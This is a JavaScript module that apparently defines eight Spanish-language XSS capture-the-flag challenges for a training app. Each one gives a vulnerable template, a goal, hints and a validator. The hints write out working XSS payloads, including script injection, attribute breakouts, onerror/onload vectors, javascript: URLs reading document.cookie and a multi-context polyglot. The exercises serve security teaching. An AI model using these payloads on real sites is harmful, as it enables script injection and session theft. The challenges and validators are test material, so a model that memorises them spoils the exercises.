export const CTF_CHALLENGES = [
  {
    id: 'ctf-1',
    level: 1,
    title: 'Inyección básica en cuerpo HTML',
    difficulty: 'Fácil',
    points: 100,
    context: 'HTML Body',
    description: 'El valor enviado se refleja directamente dentro de una etiqueta <div> sin ningún tipo de filtro ni escape.',
    initialTemplate: '<div class="user-greeting">Bienvenido, {{INPUT}}!</div>',
    goal: 'Ejecutar alert(1) o alert(document.domain) directamente.',
    hints: [
      'Usa una etiqueta <script> clásica.',
      'Escribe: <script>alert(1)</script>'
    ],
    validate: (payload) => {
      const p = (payload || '').toLowerCase();
      return (p.includes('<script>') && p.includes('</script>') && (p.includes('alert(') || p.includes('confirm(') || p.includes('prompt(')));
    }
  },
  {
    id: 'ctf-2',
    level: 2,
    title: 'Escape de atributo HTML',
    difficulty: 'Fácil',
    points: 150,
    context: 'HTML Attribute',
    description: 'La entrada se coloca dentro del atributo value de un input: <input type="text" value="{{INPUT}}">.',
    initialTemplate: '<input type="text" name="username" value="{{INPUT}}" class="form-control">',
    goal: 'Cerrar el atributo y la etiqueta para inyectar código ejecutable o un controlador onfocus/onload.',
    hints: [
      'Cierra las comillas dobles y el tag con ">".',
      'Ejemplo: "><script>alert(1)</script> o " onfocus="alert(1)" autofocus="'
    ],
    validate: (payload) => {
      const p = payload || '';
      const hasBreakout = p.startsWith('"') || p.startsWith("'") || p.includes('">') || p.includes("'>");
      const hasPayload = /<script/i.test(p) || /on\w+=/i.test(p);
      return hasBreakout && hasPayload;
    }
  },
  {
    id: 'ctf-3',
    level: 3,
    title: 'Bypass de filtro básico de <script>',
    difficulty: 'Medio',
    points: 200,
    context: 'Blacklist Filter',
    description: 'El backend elimina o bloquea la etiqueta <script>. Debes usar vectores alternativos sin usar la palabra script.',
    initialTemplate: '<div class="profile-bio">{{INPUT_SANITIZED_NO_SCRIPT}}</div>',
    goal: 'Ejecutar JavaScript usando etiquetas de imagen, svg o eventos inline.',
    hints: [
      'Las etiquetas como <img> o <svg> soportan eventos como onerror o onload.',
      'Ejemplo: <img src="x" onerror="alert(1)"> o <svg onload="alert(1)">'
    ],
    validate: (payload) => {
      const p = (payload || '').toLowerCase();
      const noScript = !p.includes('<script>') && !p.includes('</script>');
      const hasAltTag = (p.includes('<img') || p.includes('<svg') || p.includes('<body') || p.includes('<audio') || p.includes('<video')) && /on\w+=/i.test(p);
      return noScript && hasAltTag;
    }
  },
  {
    id: 'ctf-4',
    level: 4,
    title: 'Escape de bloque JavaScript en línea',
    difficulty: 'Medio',
    points: 250,
    context: 'JavaScript String Context',
    description: 'La entrada se inserta dentro de una variable en un script: <script>let search = "{{INPUT}}";</script>.',
    initialTemplate: '<script>\n  const userQuery = "{{INPUT}}";\n  console.log("Buscando:", userQuery);\n</script>',
    goal: 'Romper la cadena o cerrar la etiqueta script para ejecutar tu propio código.',
    hints: [
      'Cierra la comilla y añade un comando: "; alert(1); //',
      'O cierra directamente el tag script: </script><script>alert(1)</script>'
    ],
    validate: (payload) => {
      const p = payload || '';
      const escapesJs = (p.includes('";') || p.includes("';") || p.includes('</script>')) && (p.includes('alert') || p.includes('confirm') || p.includes('prompt') || p.includes('<script'));
      return escapesJs;
    }
  },
  {
    id: 'ctf-5',
    level: 5,
    title: 'Bypass de comillas usando Backticks o String.fromCharCode',
    difficulty: 'Difícil',
    points: 300,
    context: 'Quote-Free Execution',
    description: 'Un WAF estricto elimina todas las comillas simples (\') y dobles ("). Debes ejecutar una alerta pasando un string sin comillas.',
    initialTemplate: '<div class="output">{{INPUT_NO_QUOTES}}</div>',
    goal: 'Ejecutar alert(1) o alert(document.domain) sin usar ninguna comilla simple o doble en tu payload.',
    hints: [
      'Puedes usar números enteros: alert(1).',
      'Para cadenas, puedes usar template literals (backticks `) o /regex/.source.'
    ],
    validate: (payload) => {
      const p = payload || '';
      const hasNoQuotes = !p.includes('"') && !p.includes("'");
      const hasExec = (/<[a-z]|on\w+=/i.test(p) || p.includes('<script>')) && (p.includes('alert(') || p.includes('prompt(') || p.includes('confirm('));
      return hasNoQuotes && hasExec;
    }
  },
  {
    id: 'ctf-6',
    level: 6,
    title: 'DOM XSS a través de Hash / Fragmento',
    difficulty: 'Difícil',
    points: 350,
    context: 'DOM Sink (innerHTML)',
    description: 'La aplicación lee `location.hash` y lo inserta en el DOM mediante `element.innerHTML = decodeURIComponent(location.hash.slice(1))`.',
    initialTemplate: '<script>\n  const tab = decodeURIComponent(location.hash.slice(1));\n  document.getElementById("content").innerHTML = tab;\n</script>',
    goal: 'Construir un payload para inyectar vía hash un elemento que dispare un evento.',
    hints: [
      'El innerHTML no ejecuta etiquetas <script> directamente según la especificación W3C.',
      'Usa un vector de evento como <img src=x onerror=alert(1)>.'
    ],
    validate: (payload) => {
      const p = (payload || '').toLowerCase();
      const usesImgOrSvg = (p.includes('<img') || p.includes('<svg') || p.includes('<iframe') || p.includes('<body')) && /on\w+=/i.test(p);
      return usesImgOrSvg;
    }
  },
  {
    id: 'ctf-7',
    level: 7,
    title: 'Inyección en pseudo-protocolo de enlace',
    difficulty: 'Difícil',
    points: 400,
    context: 'Anchor href Context',
    description: 'El usuario puede ingresar su sitio web personal y se renderiza como <a href="{{INPUT}}">Visitar web</a>.',
    initialTemplate: '<a href="{{INPUT}}" class="profile-link" target="_blank">Visitar sitio web</a>',
    goal: 'Usar el pseudo-protocolo javascript: para disparar ejecución al interactuar con el enlace.',
    hints: [
      'Inicia la URL con javascript:',
      'Ejemplo: javascript:alert(document.cookie)'
    ],
    validate: (payload) => {
      const p = (payload || '').toLowerCase().trim();
      return p.startsWith('javascript:') && (p.includes('alert(') || p.includes('confirm(') || p.includes('prompt(') || p.includes('console.log('));
    }
  },
  {
    id: 'ctf-8',
    level: 8,
    title: 'Polyglot XSS definitivo',
    difficulty: 'Experto',
    points: 500,
    context: 'Multi-Context Polyglot',
    description: 'Crea un payload políglota que sea válido tanto dentro de un atributo HTML con comillas, como dentro de un bloque script, y como tag independiente.',
    initialTemplate: 'Multi-target: {{PAYLOAD}}',
    goal: 'Inyectar una estructura políglota funcional.',
    hints: [
      'Usa combinaciones de comillas, caracteres de escape y comentarios.',
      'Ejemplo clásico: jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'
    ],
    validate: (payload) => {
      const p = payload || '';
      const hasMulti = (p.includes('javascript:') || p.includes('jaVasCript:')) && p.includes('/*') && (p.includes('alert(') || p.includes('alert()') || p.includes('onload=') || p.includes('onerror='));
      return hasMulti;
    }
  }
];
